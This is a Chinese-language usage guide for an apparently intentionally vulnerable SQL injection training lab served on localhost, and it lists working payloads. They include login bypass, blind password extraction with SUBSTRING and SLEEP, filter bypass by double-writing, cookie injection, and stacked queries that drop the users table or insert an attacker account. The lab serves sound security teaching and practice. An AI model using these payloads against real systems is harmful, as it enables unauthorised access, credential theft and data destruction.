# 使用说明

## 快速开始

### 启动服务

```bash
go run src/main.go
```

访问 http://localhost:8080 查看主页。

### 初始化数据库

首次使用需要初始化数据库：

```bash
go run src/main.go --setup-db
```

## 基础注入示例

### Less-1: Error Based - String

访问：
```
http://localhost:8080/less/less-1?id=1
```

测试注入：
```
http://localhost:8080/less/less-1?id=1'
http://localhost:8080/less/less-1?id=1' OR '1'='1
```

### Less-2: Error Based - Integer

访问：
```
http://localhost:8080/less/less-2?id=1
```

测试注入：
```
http://localhost:8080/less/less-2?id=1 OR 1=1
```

## POST 注入示例

### Less-11: POST - Error Based

访问表单页面：
```
http://localhost:8080/less/less-11
```

输入：
- Username: `admin' OR '1'='1`
- Password: `anything`

## 盲注示例

### Less-8: Boolean Based Blind

正常请求：
```
http://localhost:8080/less/less-8?id=1
```

返回 "You are in..........."

错误请求：
```
http://localhost:8080/less/less-8?id=1'
```

无返回（布尔盲注特征）

### Less-9: Time Based Blind

使用延时注入：
```
http://localhost:8080/less/less-9?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

## WAF 绕过示例

### Less-25: OR & AND Bypass

过滤了 OR 和 AND：
```
http://localhost:8080/less/less-25?id=1' || '1'='1
```

使用双写绕过：
```
http://localhost:8080/less/less-25?id=1' OORR '1'='1
```

## Cookie 注入示例

### Less-20: Cookie Injection

1. 先登录获取 Cookie
2. 修改 Cookie 中的 uname 值：
```
Cookie: uname=admin' OR '1'='1
```

## API 接口

### 获取漏洞列表

```bash
curl http://localhost:8080/api/vulnerabilities
```

### 获取单个漏洞信息

```bash
curl http://localhost:8080/api/vulnerabilities/less-1
```

### 健康检查

```bash
curl http://localhost:8080/health
```

## 日志查看

日志文件位于 `logs/app.log`：

```bash
tail -f logs/app.log
```

## 配置文件

编辑 `config/app.yaml` 修改配置：

```yaml
server:
  port: 8080

database:
  type: sqlite  # 或 mysql, postgres

log:
  level: info   # debug, info, warn, error
```

## 测试用 Payload

### Error Based

```sql
' OR '1'='1
' OR 1=1-- -
' UNION SELECT null,null-- -
```

### Boolean Blind

```sql
' AND 1=1-- -
' AND 1=2-- -
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

### Time Based

```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND 1=IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>100,SLEEP(5),0)-- -
```

### Stacked Query

```sql
'; DROP TABLE users;-- -
'; INSERT INTO users VALUES(99,'hacker','hacked');-- -
```

## 安全提示

⚠️ **所有测试请仅在授权环境下进行！**
